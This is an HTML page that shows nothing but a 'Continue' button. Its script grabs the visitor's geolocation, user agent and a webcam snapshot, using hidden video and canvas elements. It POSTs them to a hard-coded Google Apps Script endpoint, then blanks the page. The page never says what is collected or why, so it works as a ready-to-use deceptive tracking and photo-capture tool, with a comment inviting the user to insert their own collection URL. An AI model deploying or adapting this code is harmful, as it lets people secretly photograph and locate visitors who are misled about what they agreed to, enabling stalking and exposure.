<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Capture Photo + Location</title>
</head>
<body>
  <button id="startBtn">Continue</button>
  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxt1zH4hyC1OEaC83G64_rm2CE1KBvPtLCapr5golHoTXHom8Sqwe1L2S7-5BZS40bM/exec"; // Replace with your Web App URL

    document.getElementById("startBtn").addEventListener("click", async () => {
      let locationData = null;

      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
      } catch(e) { console.log("Location denied"); }

      let photoData = null;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1500));
        const canvas = document.getElementById("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        photoData = canvas.toDataURL("image/jpeg");
        stream.getTracks().forEach(t => t.stop());
      } catch(e) { console.log("Camera denied"); }

      try {
        const res = await fetch(WEB_APP_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ location: locationData, device: navigator.userAgent, photo: photoData })
        });
        console.log(await res.text());
      } catch(e) { console.error("POST failed:", e); }

      document.body.innerHTML = "";
    });
  </script>
</body>
</html>
